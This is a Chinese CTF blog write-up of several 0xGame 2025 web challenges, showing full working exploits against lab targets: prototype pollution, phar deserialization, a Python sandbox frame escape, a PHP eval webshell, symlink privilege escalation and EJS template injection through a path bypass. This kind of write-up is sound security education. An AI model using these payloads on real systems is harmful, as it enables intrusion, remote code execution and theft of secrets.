---
description: '记录 0xGame 2025 Week3 的题目思路、利用链和关键细节。'
title: 0xgame2025 （week3
date: 2025-10-29T09:27:17Z
lastmod: 2025-11-11T20:40:53Z
top_img: /img/2abc3f959e3c1983556049fa213be07c.jpg
tags: [CTF,WP]
categories: [CTF,WP]
toc: true
toc_number: true
mathjax: false
katex: false
comments: true
---

# 0xgame2025 （week3

## ⻓夜⽉

```js
//源码app.py
const fs = require('fs');
const express = require('express');
//const session = require('express-session');
const bodyParser = require('body-parser');
const jwt = require('jsonwebtoken');
const crypto = require("crypto");
const cookieParser = require('cookie-parser');
 const DEFAULT_CONFIG = {
     name: "EverNight",
     default_path: "The Remembrance",
     place: "Amphoreus",
     min_public_time: "2025-08-03"
};
const CONFIG = {
    name: "EverNight",
    default_path: "The Remembrance",
    place: "Amphoreus"
}

const users = new Map();
const FLAG = process.env.FLAG || 'oXgAmE{Just_A_Flag}'
const JWT_SECRET = crypto.randomBytes(32).toString('hex');

const app = express(); 
app.set('view engine', 'ejs');
app.use(express.static('public'));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(cookieParser());


if (!fs.existsSync('p@sswd.txt')) {
    fs.writeFileSync('p@sswd.txt', crypto.randomBytes(16).toString('hex').trim());
}

users.set('admin', fs.readFileSync('p@sswd.txt').toString())

// function requireLogin(req, res, next) {
//     const token = req.cookies.token || req.headers.authorization?.split(' ')[1];
    
//     if (!token) {
//         return res.redirect('/login', );
//     }
// }

function merge(dst, src) {
    if (typeof dst !== "object" || typeof src !== "object") return dst;
    for (let key in src) {
        if (key in src && key in dst) {
            merge(dst[key], src[key]);
        } else {
            dst[key] = src[key];
        }
    }
}

function generateJWT(username, password) {
    return jwt.sign({ username, password }, JWT_SECRET, { expiresIn: '10h' });
}

function Check(token){
    if(!token){
        res.redirect('/login');
    }
    const data = jwt.decode(token);
    
    if(data.username === "admin"){
        return true;
    } else{
        return false;
    }
}

function Admin_Check(req, res, next){
    const token = req.cookies.token || req.headers.authorization?.split(' ')[1];

    if(!token){
        return res.redirect('/login', {message: "Need Login!"});
    }

    try{
        const data = jwt.decode(token);
        if(data.username === 'admin'){
            return next();
        } else{
            return res.redirect('/trailblazer');
        }
    } catch (err){
        return res.redirect('/login');
    }
}

app.get('/', (req, res) => {
    res.render('index');
})

app.get('/login', (req, res) => {
    res.render('login');
})

app.get('/register', (req, res) => {
    res.render('register', { message: '' });
});

app.get('/logout', (req, res) => {
    res.clearCookie('token');
    res.redirect('/login');
});

app.post('/login', (req, res) => {
    let username = req.body.username;
    let password = req.body.password;
    let token = req.cookies.token || req.headers.authorization?.split(' ')[1];

    if (!users.has(username)) {
        return res.render('login', { message: 'Invalid username or password.' });
    }

    if (users.get(username) !== password) {
        return res.render('login', { message: 'Invalid username or password.' });
    }

    if(Check(token)){
        res.redirect('/admin_club1st');
    } else{
        res.redirect('/trailblazer');
    }
});

app.post('/register', (req, res) => {
    let username = req.body.username;
    let password = req.body.password;

    if (users.has(username)) {
        return res.render('register', { message: 'Username already exists.' });
    }

    users.set(username, password);
    const data = generateJWT(username, password);
    res.cookie('token', data, {httpOnly: false});
    res.redirect('/login');
});

app.get('/admin_club1st', Admin_Check, (req, res) => { 
    return res.render('admin');
})

app.post('/admin_club1st', Admin_Check, (req, res) => {
    let body = req.body;
    let evernight = Object.create(CONFIG);
    let min_public_time = CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time;
    merge(evernight, body);    
    let en = Object.create(CONFIG);

    if (en.min_public_time < "2025-08-03") {
        return res.render('march7th', {message: FLAG});
    }

    return res.render('evernight');
});

app.get('/trailblazer', (req, res) => {
    return res.render('trailblazer', {message: "Failed Amphoreus"})
})

app.listen(80, () => {
    console.log('Server is running on port 80');
})
```

```js
有个merge，应该是污染en.min_public_time
 if (en.min_public_time < "2025-08-03") {
        return res.render('march7th', {message: FLAG});
    }
还有个token验证
function Check(token){
    if(!token){
        res.redirect('/login');
    }
    const data = jwt.decode(token);
    
    if(data.username === "admin"){
        return true;
    } else{
        return false;
    }
}
```

我们那开始操作吧，注册用户，登入一次，抓包看token，然后用户的token改为admin

{% asset_img 9baa210f-f244-4946-ae71-68b7415dcfad-20251030214816-1bskecx.png web2解题过程截图 %}

我们再用我们修改的token登入我们的账号

{% asset_img 5b39bd9c-82fc-4381-97ce-afa5adbf2aa8-20251030214951-q8kku28.png web2解题过程截图 %}

跟随重定向来到{% asset_img e8a61f79-72f8-44c1-8156-be9353ce0629-20251030215022-o6s0se7.png web2解题过程截图 %}

后面就是污染en.min_public_time

```js
{
 "name":"EverNight",
 "default_path":"The Remembrance",
 "place":"Amphoreus",
 "__proto__":{
 "min_public_time":"2024-08-032"
 }
}
```

{% asset_img 3e685fab-277e-4f0d-a11e-389d0fc0e021-20251030215447-kqjgyju.png web2解题过程截图 %}

## 文件查询器（蓝）

有个查询功能和文件上传功能

我们F12一下发现了这个

{% asset_img 6993cff6-a99d-4051-9a0e-52730854fda4-20251029092834-pkuhi6p.png web2解题过程截图 %}

我们查询一下upload.php和index.php

```php
//upload.php
<?php
error_reporting(0);
$White_List = array("jpg", "png", "pdf");
$temp = explode(".", $_FILES["file"]["name"]);
$extension = end($temp);
if (($_FILES["file"]["size"] && in_array($extension, $White_List)))
{
    $content=file_get_contents($_FILES["file"]["tmp_name"]);
    $pos = strpos($content, "__HALT_COMPILER();");
    if(gettype($pos)==="integer")
    {
        die("你猜我想让你干什么喵");
    }
    else
    {
        if (file_exists("./upload/" . $_FILES["file"]["name"]))
        {
            echo $_FILES["file"]["name"] . " Already exists. ";
        }
        else
        { 
            $file = fopen("./upload/".$_FILES["file"]["name"], "w");
            fwrite($file, $content); 
            fclose($file);
            echo "Success ./upload/".$_FILES["file"]["name"];
        }
    }
}
else
{ 
    echo "请重新尝试喵"; 
} 
?>
```

```php
//index.php
<?php
error_reporting(0);
class MaHaYu{
    public $HG2;
    public $ToT;
    public $FM2tM;
    public function __construct()
    {
      $this -> ZombiegalKawaii();
    }
    
    public function ZombiegalKawaii()
    {
      $HG2 = $this -> HG2;
      if(preg_match("/system|print|readfile|get|assert|passthru|nl|flag|ls|scandir|check|cat|tac|echo|eval|rev|report|dir/i",$HG2))
      {
        die("这这这你也该绕过去了吧");
      }
      else{
        $this -> ToT = "这其实是来占位的";

      }
    }

    public function __destruct()
    {
      $HG2 = $this -> HG2;
      $FM2tM = $this -> FM2tM;
      echo "Wow";
      var_dump($HG2($FM2tM));
    }
}

$file=$_POST['file'];
if(isset($_POST['file']))
{
    if (preg_match("/'[\$%&#@*]|flag|file|base64|go|git|login|dict|base|echo|content|read|convert|filter|date|plain|text|;|<|>/i", $file))
    {
        die("对方撤回了一个请求，并企图萌混过关");
    }
    echo base64_encode(file_get_contents($file));
}
```

虽然过滤了很多函数但是我们慢慢看就会发现`shell_exec()`没被过滤

然后我们看到`file_get_contents`​和`__HALT_COMPILER();`，一眼phar了

然后拿板子改

```php
<?php
 class MaHaYu{
 public $HG2 = "shell_exec";
 public $ToT = "11111";
 public $FM2tM = "env";
 }
 
 $o = new MaHaYu();
 $phar = new Phar("phar.phar");
 $phar->startBuffering();
 $phar->setStub("<?php __HALT_COMPILER(); ?>");
 $phar->setMetadata($o);
 $phar->addFromString("test.txt", "test");
 $phar->stopBuffering();
```

因为要绕过$pos = strpos($content, "__HALT_COMPILER();");的检查，我们直接php生成

```sh
php -r "file_put_contents('phar.png', gzencode(file_get_contents('phar.phar')));"
//然后在文件查询用phar://读一下图片
phar://./upload/phar.png
```

{% asset_img 1c5a85af-d9d3-4455-954e-a2bd33ceaa2e-20251030195356-r75d28k.png web2解题过程截图 %}

## 消栈逃出沙箱(1)反正不会有2

```python
#拿到代码先让ai整理一下
from flask import Flask, request, Response
import sys
import io

app = Flask(__name__)

blackchar = "&*^%#${}@!~`·/<>"

def safe_sandbox_Exec(code):#这里限制了使用函数
    whitelist = {
        "print": print,
        "list": list,
        "len": len,
        "Exception": Exception
    }
    safe_globals = {"__builtins__": whitelist}
    original_stdout = sys.stdout
    original_stderr = sys.stderr
    sys.stdout = io.StringIO()
    sys.stderr = io.StringIO()
    try:
        exec(code, safe_globals)
        output = sys.stdout.getvalue()
        error = sys.stderr.getvalue()
        return output or error or "No output"
    except Exception as e:
        return f"Error: {e}"
    finally:
        sys.stdout = original_stdout
        sys.stderr = original_stderr


@app.route('/')
def index():
    return open(__file__).read()


@app.route('/check', methods=['POST'])
def check():
    data = request.form['data']
    if not data:
        return Response("NO data", status=400)
    for d in blackchar:
        if d in data:
            return Response("NONONO", status=400)
    secret = safe_sandbox_Exec(data)
    return Response(secret, status=200)


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=9000)

```

我们能看到这里面的函数是被限制了的，只能使用 `print`​, `list`​, `len`​, `Exception` 四个函数

```python
whitelist = {
        "print": print,
        "list": list,
        "len": len,
        "Exception": Exception
    }
    safe_globals = {"__builtins__": whitelist}
```

栈帧逃逸的话，这里利用的是Exception（因为留了这个），我们先用`__traceback__.tb_frame`​来获取位置然后用`.f_back`回溯

我们需要回溯到check路由，回溯路径的话就是

```txt
 int('')
    ↓ f_back （第一层
safe_sandbox_Exec 
    ↓ f_back  (第二层
  /check  
```

比较清晰了

```txt
import requests

url='http://9000-f4b6ca11-8673-4c01-8826-061cad6484d7.challenge.ctfplus.cn/check'
payload='''
try:
    int()
except Exception as Xen:
    frame=Xen.__traceback__.tb_frame.f_back.f_back
    all=frame.f_globals['__builtins__']
    output=all.__import__('os').popen('env').read()
    print(output)
'''
res=requests.post(url, data={"data": payload})

print(res.text)
```

## 放开我的变量

一个博客页面，我们先扫了再说

```txt
[22:21:09] 301 -   48B  - /debug/pprof  ->  /debug/pprof/                   
[22:21:09] 200 -    3KB - /debug/pprof/                                     
[22:21:09] 200 -    8KB - /debug/pprof/goroutine?debug=1                    
[22:21:09] 200 -   33KB - /debug/pprof/heap                                 
[22:21:10] 200 -   51KB - /debug/pprof/trace                                
[22:21:11] 200 -   65B  - /health                                           
[22:21:15] 200 -  128B  - /metrics                                          
[22:21:18] 200 -    2B  - /ping                                             
[22:21:20] 200 -  117B  - /robots.txt 
```

我们查看robots.txt发现`/asdback.php`路由

```txt
<?php

highlight_file(__FILE__);
echo("Please Input Your CMD");
$cmd = $_POST['__0xGame2025phpPsAux'];
eval($cmd);
?> Please Input Your CMD
```

php非法参数名传参解析  
当`PHP版本小于8`​时，如果参数中出现中括号`[`​，中括号会被转换成下划线`_`​，但是会出现转换错误导致接下来如果该参数名中还有`非法字符`​并不会继续转换成下划线`_`​，也就是说如果中括号`[`​出现在前面，那么中括号`[`​还是会被转换成下划线`_`​，但是因为出错导致接下来的非法字符并不会被转换成下划线`_`

我们直接用`_[0xGame2025phpPsAux=system("ls /");`,发现flag,但是无法访问,猜是权限不够,我们写马连一下蚁剑

​`_[0xGame2025phpPsAux=file_put_contents('1.php', '<?php @eval($_POST["cmd"]); ?>');`

sudo没用我们看看ps -aux,发现start.sh有root权限,我们看看是啥玩意

{% asset_img ce3f81a4-e02a-471c-b5d1-ed40a5d11130-20251108224114-37eumyp.png web2解题过程截图 %}我们看看这玩意是什么

{% asset_img a9e987a6-1532-4698-a9a0-db568d10295f-20251108230430-97uw0he.png web2解题过程截图 %}

每 5 秒钟将 `/var/www/html/primary`​ 目录中的所有文件复制到 `/var/www/html/marstream/`​ 目录，并设置复制后文件的权限为 `755`

那我们

[N1CTF junior 2025 Web wp - Infernity&apos;s Blog](https://infernity.top/2025/02/12/N1CTF2025/#backup)

```bash
cd primary
echo "" > -H   #或者 touch -- -H   //--的作用是不解析后面的参数
ln -s /flag abc
cat /var/www/html/marstream/abc
```

## New_Python!

注册进入获得代码

```python
from Crypto.Util.number import getPrime, bytes_to_long
from gmpy2 import invert
import random
import uuid

# 通过RSA得到UUID8的a
# 再通过其他方式获取到b和c
# 利用UUID8生成Admin密码

msg= b''
BITS = 1024
e = 65537

p = getPrime(BITS//2)
q = getPrime(BITS//2)
n = p * q

phi = (p - 1) * (q - 1)
d = int(invert(e, phi))

key = bytes_to_long(msg)

c = pow(key, e, n)

dp = d % (p - 1)

#print("n = ", n)
#print("e = ", e)
#print("c = ", c)
#print("dp = ", dp)

key = "" #{}内的
key = key.encode()
key = int.from_bytes(key, 'big')
pa = uuid.uuid8(a=key)

#n = 70344167219256641077015681726175134324347409741986009928113598100362695146547483021742911911881332309275659863078832761045042823636229782816039860868563175749260312507232007275946916555010462274785038287453018987580884428552114829140882189696169602312709864197412361513311118276271612877327121417747032321669
#e =  65537
#c =  46438476995877817061860549084792516229286132953841383864271033400374396017718505278667756258503428019889368513314109836605031422649754190773470318412332047150470875693763518916764328434140082530139401124926799409477932108170076168944637643580876877676651255205279556301210161528733538087258784874540235939719
#dp =  7212869844215564350030576693954276239751974697740662343345514791420899401108360910803206021737482916742149428589628162245619106768944096550185450070752523
```

a通过rsa获得

```python
from math import gcd
from Crypto.Util.number import *

# 已知参数
n = 70344167219256641077015681726175134324347409741986009928113598100362695146547483021742911911881332309275659863078832761045042823636229782816039860868563175749260312507232007275946916555010462274785038287453018987580884428552114829140882189696169602312709864197412361513311118276271612877327121417747032321669
e = 65537
c = 46438476995877817061860549084792516229286132953841383864271033400374396017718505278667756258503428019889368513314109836605031422649754190773470318412332047150470875693763518916764328434140082530139401124926799409477932108170076168944637643580876877676651255205279556301210161528733538087258784874540235939719
dp = 7212869844215564350030576693954276239751974697740662343345514791420899401108360910803206021737482916742149428589628162245619106768944096550185450070752523

# 开始爆破
for k in range(1, e):
    if (e * dp - 1) % k == 0:
        p_candidate = (e * dp - 1) // k + 1
        if n % p_candidate == 0:
            p = p_candidate
            q = n // p
            break

phi = (p - 1) * (q - 1)
d = inverse(e, phi)

m = pow(c, d, n)
plaintext = long_to_bytes(m)
print("明文:", plaintext)

#key{rsaisfunbutisitweborcrypto}
```

通过这个获得a的值

```python
key = "" #{}内的
key = key.encode()
key = int.from_bytes(key, 'big')
pa = uuid.uuid8(a=key)
print(key)
#a=183915192278352122275137263475187826728085592578452428749304943
```

现在还缺b和c，扫一下

```bash
[23:46:52] Starting:                                                         
[23:47:14] 200 -   76B  - /auth                                             
[23:47:22] 301 -   48B  - /debug/pprof  ->  /debug/pprof/                   
[23:47:22] 200 -    3KB - /debug/pprof/
[23:47:22] 200 -   12KB - /debug/pprof/goroutine?debug=1                    
[23:47:22] 200 -   35KB - /debug/pprof/heap
[23:47:23] 200 -   59KB - /debug/pprof/trace                                
[23:47:27] 200 -   65B  - /health                                           
[23:47:33] 200 -    4KB - /login
[23:47:35] 200 -  128B  - /metrics
[23:47:41] 200 -    2B  - /ping
[23:47:43] 200 -    5KB - /register
[23:47:52] 200 -    4KB - /user
```

/athu发现c和b

{% asset_img 7a57ebb8-a07f-4ee8-8b85-e894a9a8ad88-20251110201400-xhzs4la.png web2解题过程截图 %}

```bash
import uuid
key = "rsaisfunbutisitweborcrypto" 
key = key.encode()
key = int.from_bytes(key, 'big')
pa = uuid.uuid8(a=key)
print(key)

print(uuid.uuid8(a=key ,b=120604030108,c=7430469441))

#183915192278352122275137263475187826728085592578452428749304943
#63727970-746f-849c-8000-0001bae3f741
```

admin登入后查看env即可

## 这真的是文件上传

先看源码吧

```js
//original-author: gtg2619
//adapt: P
const express = require('express');
const ejs = require('ejs');
const fs = require('fs');
const path = require('path');

const app = express();
app.set('view engine', 'ejs');
app.use(express.json({
    limit: '114514mb'
}));

const STATIC_DIR = __dirname;

function serveIndex(req, res) {
    // Useless Check , So It's Easier

    var whilePath = ['index'];
    var templ = req.query.templ || 'index';

    if (!whilePath.includes(templ)){
        return res.status(403).send('Denied Templ');
    }

    var lsPath = path.join(__dirname, req.path);

    try {
        res.render(templ, {
            filenames: fs.readdirSync(lsPath),
            path: req.path
        });
    } catch (e) {
        res.status(500).send('Error');
    }
}

app.use((req, res, next) => {
    if (typeof req.path !== 'string' || 
            (typeof req.query.templ !== 'string' && typeof req.query.templ !== 'undefined' && typeof req.query.templ !== null)
        ) res.status(500).send('Error');
    else if (/js$|\.\./i.test(req.path)) res.status(403).send('Denied filename');
    else next();
})

app.use((req, res, next) => {
    if (req.path.endsWith('/')) serveIndex(req, res);
    else next();
})

app.put('/*', (req, res) => {
    // Why Filepath Not Check ?
    const filePath = path.join(STATIC_DIR, req.path);

    fs.writeFile(filePath, Buffer.from(req.body.content, 'base64'), (err) => {
        if (err) {
            return res.status(500).send('Error');
        }
        res.status(201).send('Success');
    });
});

app.listen(80, () => {
    console.log(`running on port 80`);
});

```

我们分析分析

```js
app.use((req, res, next) => {
    if (typeof req.path !== 'string' || 
            (typeof req.query.templ !== 'string' && typeof req.query.templ !== 'undefined' && typeof req.query.templ !== null)
        ) res.status(500).send('Error');
    else if (/js$|\.\./i.test(req.path)) res.status(403).send('Denied filename');
    else next();
})

app.use((req, res, next) => {
    if (req.path.endsWith('/')) serveIndex(req, res);
    else next();
})
```

这里过滤了js结尾和..的目录穿越，能用/.绕过，就比如在所有类 Unix 系统（包括 Linux、macOS）以及 Windows 中：

```bash
. 表示 当前目录
.. 表示 父目录

$ pwd
/a/b
$ ls .
# 等价于 ls /a/b
```

所以路径中的 `/a/b/.` 意思是，进入 /a，再进入 b，然后进入 当前目录（也就是 b 自己）

然后我们看看

```js
function serveIndex(req, res) {
    // Useless Check , So It's Easier

    var whilePath = ['index'];
    var templ = req.query.templ || 'index';

    if (!whilePath.includes(templ)){
        return res.status(403).send('Denied Templ');
    }

    var lsPath = path.join(__dirname, req.path);

    try {
        res.render(templ, {
            filenames: fs.readdirSync(lsPath),
            path: req.path
        });
    } catch (e) {
        res.status(500).send('Error');
    }
}
```

这边能渲染index，传个?temp=...就行了

写了是view的话，目录就是/views/index.ejs/.

我们整个页面

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>SSTI Example</title>
</head>
<body>
  <h2>Server Environment</h2>
  <hr>
  <ul>
    <%= process.mainModule.require('child_process').execSync('env').toString() %>
  </ul>
  <hr>
</body>
</html>
```

```http
PUT /views/index.ejs/. HTTP/1.1
Host: nc1.ctfplus.cn:11304
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 370
Content-Type:application/json

{"content":"PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgPG1ldGEgY2hhcnNldD0iVVRGLTgiPgogIDx0aXRsZT5TU1RJIEV4YW1wbGU8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogIDxoMj5TZXJ2ZXIgRW52aXJvbm1lbnQ8L2gyPgogIDxocj4KICA8dWw+CiAgICA8JT0gcHJvY2Vzcy5tYWluTW9kdWxlLnJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjU3luYygnZW52JykudG9TdHJpbmcoKSAlPgogIDwvdWw+CiAgPGhyPgo8L2JvZHk+CjwvaHRtbD4K"}
```

然后访问/views/?templ=index就行了

# 总结一下

依旧是熟悉的总结，这次拖的更久了，怎么回事，必须鞭策一下自己了

